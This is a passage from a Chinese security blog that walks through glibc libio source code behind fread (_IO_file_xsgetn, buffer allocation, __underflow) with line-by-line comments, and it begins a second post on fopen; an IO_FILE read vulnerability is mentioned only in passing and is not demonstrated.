*/</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp); <span class="comment">/* 建立输入缓冲区 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) <span class="comment">/* want为需要的数据 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr; <span class="comment">/* 计算拥有的输入缓冲区大小 */</span></span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have) <span class="comment">/* 输入缓冲区够用 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want); <span class="comment">/* 直接把输入缓冲区拷贝给目标变量 */</span></span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="comment">/* 输入缓冲区不够用 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>) <span class="comment">/* 先把可以用的缓冲区用光 */</span></span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      s += have;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  <span class="keyword">if</span> (_IO_in_backup (fp)) <span class="comment">/* 基础检查,可以跳过 */</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_switch_to_main_get_area (fp);</span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF) </span><br><span class="line">              <span class="comment">/* 执行系统调用read读取数据,并放入到输入缓冲区里 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* 进行FILE结构体的更新设置 */</span></span><br><span class="line"></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_file_xsgetn</code> 是处理 <code>fread</code> 读入数据的核心函数，分为三个部分： </p>
<ul>
<li>第一部分是 <code>fp-&gt;_IO_buf_base</code> 为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用 <code>_IO_doallocbuf</code> 去初始化指针，建立输入缓冲区</li>
<li>第二部分是输入缓冲区里有输入并且够用，此时将缓冲区里的数据直接拷贝至目标buff</li>
<li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用 <code>__underflow</code> 调用系统调用读入数据到缓冲区，然后再把数据从缓冲区中复制给用户</li>
</ul>
<p><strong>建立输入缓冲区</strong></p>
<p>如果输入缓存区未建立，那么程序会调用 _IO_doallocbuf 建立输入缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_doallocbuf (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base) <span class="comment">/* 如果输入缓冲区不为空，直接返回(再次检查输入缓存区) */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">      <span class="comment">/* 检查fp-&gt;_flags是否为_IO_UNBUFFERED || fp-&gt;_mode大于0 */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF) <span class="comment">/* 调用vtable函数(_IO_file_doallocate) */</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="comment">/* 设置_IO_buf_base和_IO_buf_end*/</span></span><br><span class="line">    <span class="comment">/* 如果_IO_DOALLOCATE调用失败,那么其内部的_IO_setb将无法调用,可能会出现BUG */</span></span><br><span class="line">    <span class="comment">/* 所以在_IO_DOALLOCATE外面再次调用_IO_setb以防万一 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果条件满足，就会调用 vtable 中的  _IO_file_doallocate（建立输入缓冲区和主体）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ALLOC_BUF(_B, _S, _R) \</span></span><br><span class="line"><span class="meta">       do &#123;								      \</span></span><br><span class="line"><span class="meta">	  (_B) = (char *) mmap (0, ROUND_TO_PAGE (_S),			      \</span></span><br><span class="line"><span class="meta">				PROT_READ | PROT_WRITE,			      \</span></span><br><span class="line"><span class="meta">				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);	      \</span></span><br><span class="line"><span class="meta">	  <span class="meta-keyword">if</span> ((_B) == (char *) MAP_FAILED)				      \</span></span><br><span class="line"><span class="meta">	    return (_R);						      \</span></span><br><span class="line"><span class="meta">       &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_file_doallocate (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="keyword">int</span> couldbetty;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">G_stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_cleanup_registration_needed)</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &lt; <span class="number">0</span> || _IO_SYSSTAT (fp, &amp;st) &lt; <span class="number">0</span>) </span><br><span class="line">      <span class="comment">/* 获取文件信息(vtable-&gt;__stat) */</span></span><br><span class="line">    &#123;</span><br><span class="line">      couldbetty = <span class="number">0</span>;</span><br><span class="line">      size = _IO_BUFSIZ;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      <span class="comment">/* do not try to optimise fseek() */</span></span><br><span class="line">      fp-&gt;_flags |= __SNPT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      couldbetty = S_ISCHR (st.st_mode);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">      size = st.st_blksize &lt;= <span class="number">0</span> ? _IO_BUFSIZ : st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      size = _IO_BUFSIZ;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  ALLOC_BUF (p, size, EOF); <span class="comment">/* 通过mmap分配内存 */</span></span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (couldbetty &amp;&amp; isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取文件信息后，利用宏函数 ALLOC_BUF 分配内存，接着调用 _IO_setb ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_setb (f, b, eb, a)</span><br><span class="line">     _IO_FILE *f;</span><br><span class="line">      <span class="keyword">char</span> *b;</span><br><span class="line">     <span class="keyword">char</span> *eb;</span><br><span class="line">     <span class="keyword">int</span> a;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    FREE_BUF (f-&gt;_IO_buf_base, _IO_blen (f));</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a) <span class="comment">/* 设置flag */</span></span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置了 <code>_IO_buf_base</code> 和 <code>_IO_buf_end</code>  </p>
<p><strong>将缓冲区里的数据直接拷贝至目标buff</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (want &gt; <span class="number">0</span>) <span class="comment">/* want为需要的数据 */</span></span><br><span class="line">   &#123;</span><br><span class="line">     have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr; <span class="comment">/* 计算拥有的输入缓冲区大小 */</span></span><br><span class="line">     <span class="keyword">if</span> (want &lt;= have) <span class="comment">/* 输入缓冲区够用 */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want); <span class="comment">/* 直接把输入缓冲区拷贝给目标变量 */</span></span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">     ........</span><br></pre></td></tr></table></figure>
<p>这部分比较简单，判断输入缓冲区够用以后，直接就复制给用户缓冲区了（目标变量）</p>
<p><strong>调用系统调用读入数据</strong></p>
<p>如果是输入缓冲区里的数据为空或者是不能满足全部的需求，则会调用  __underflow ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__underflow (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_vtable_offset == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp); </span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp); <span class="comment">/* vtable-&gt;_IO_new_file_underflow */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面的都是检查直接跳过，到后面调用  <code>_IO_UNDERFLOW</code> 才是关键（其实它就vtable里面的 <code>_IO_new_file_underflow</code>）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_underflow _IO_file_underflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN) <span class="comment">/* _flag标志位是否包含_IO_NO_READS */</span></span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) <span class="comment">/* 调用_IO_doallocbuf分配输入缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    _IO_flush_all_linebuffered ();</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* _IO_SYSREAD == vtable-&gt;_IO_file_read,程序最终会调用read */</span></span><br><span class="line">    <span class="comment">/* 执行read读取数据到fp-&gt;_IO_buf_base,读入大小为输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count; <span class="comment">/* 更新输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数执行完后，返回到 <code>_IO_file_xsgetn</code> 函数中，由于 <code>while</code> 循环的存在，重新执行第二部分，此时将输入缓冲区拷贝至目标缓冲区，最终返回</p>
<hr>
<p>在  IO_FILE任意读 （基于stdin的地址任意读） 漏洞中，最关键的函数应是 <code>_IO_new_file_underflow</code> ，它里面有个标志位的判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这个漏洞我还不熟，后面熟悉了再慢慢说</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/30/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afopen/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/30/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afopen/" class="post-title-link" itemprop="url">IO_FILE源码分析：fopen</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-30 18:18:39" itemprop="dateCreated datePublished" datetime="2022-03-30T18:18:39+08:00">2022-03-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-31 01:09:16" itemprop="dateModified" datetime="2022-03-31T01:09:16+08:00">2022-03-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：fopen"><a href="#IO-FILE源码分析：fopen" class="headerlink" title="IO_FILE源码分析：fopen"></a>IO_FILE源码分析：fopen</h2><p>连续做了几个 IO_FILE pwn 的题目，发现自己对于 IO_FILE 漏洞的原理不是很了解，于是打算学习学习 IO_FILE 的源码</p>
<p>我打算先学习源码，之后再学习漏洞利用的底层原理</p>
<p>感谢 raycp 师傅的源码讲解！！！</p>
<hr>
<p>fopen 是IO中最重要的函数之一，每当我们想打开文件时，第一个调用的便是这个函数</p>
<p>先看看它的源码：（libc-2.23）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __STDC__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;shlib-compat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span 